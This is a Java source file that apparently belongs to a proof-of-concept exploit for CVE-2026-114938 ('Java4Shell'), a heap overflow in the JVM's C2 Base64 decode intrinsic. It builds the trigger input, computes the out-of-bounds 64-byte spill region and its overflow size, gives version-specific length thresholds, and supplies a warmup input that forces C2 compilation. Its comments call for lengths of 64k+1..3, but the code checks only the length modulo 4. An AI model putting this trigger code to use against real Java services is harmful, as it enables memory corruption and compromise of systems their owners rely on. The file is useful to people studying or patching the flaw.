package com.aweimc.j4shell;

import java.nio.charset.StandardCharsets;

/**
 * Trigger geometry helpers for CVE-2026-114938 (Java4Shell).
 *
 * The bug only fires for input lengths encodedLen = 64k + 1..3 with a trailing '=':
 * the C2-compiled Base64 decode intrinsic (AVX-512 VBMI path) underflows the output
 * length during the tail fixup, bzhiq(-1,-1) yields an all-ones mask, and evmovdqub
 * performs a fixed 64-byte store at [spillStart, spillStart+64) where
 * spillStart = (len-1)/4*3.
 *
 * Thresholds: Java 17 line requires len >= 129 (65/66/67 do not overflow);
 * Java 21/25 line requires len >= 65.
 */
public final class Payload {

    private Payload() { }

    /** Build the trigger: (len-1) 'A' characters followed by one '=' (len must be 64k+1..3). */
    public static byte[] trigger(int len) {
        if (!isTriggerShape(len)) {
            throw new IllegalArgumentException("not a trigger length: " + len + " (need 64k+1..3)");
        }
        return ("A".repeat(len - 1) + "=").getBytes(StandardCharsets.US_ASCII);
    }

    /** Exact logical output length (the size of the dst allocated inside decode(byte[])). */
    public static int logicalOut(int len) {
        return ((len + 3) / 4) * 3 - 1;
    }

    /** Start offset of the fixed 64-byte store. */
    public static int spillStart(int len) {
        return ((len - 1) / 4) * 3;
    }

    /** Exclusive end of the spill region: spillStart + 64. */
    public static int spillEnd(int len) {
        return spillStart(len) + 64;
    }

    /** Bytes written past the exact-size dst. */
    public static int spillOver(int len) {
        return spillEnd(len) - logicalOut(len);
    }

    public static boolean isTriggerShape(int len) {
        int r = len % 4;
        return r == 1 || r == 2 || r == 3;
    }

    /** Warmup input: 128 'A' characters (valid Base64, below the 129 threshold - fills C2 only). */
    public static byte[] validWarm() {
        return "A".repeat(128).getBytes(StandardCharsets.US_ASCII);
    }
}
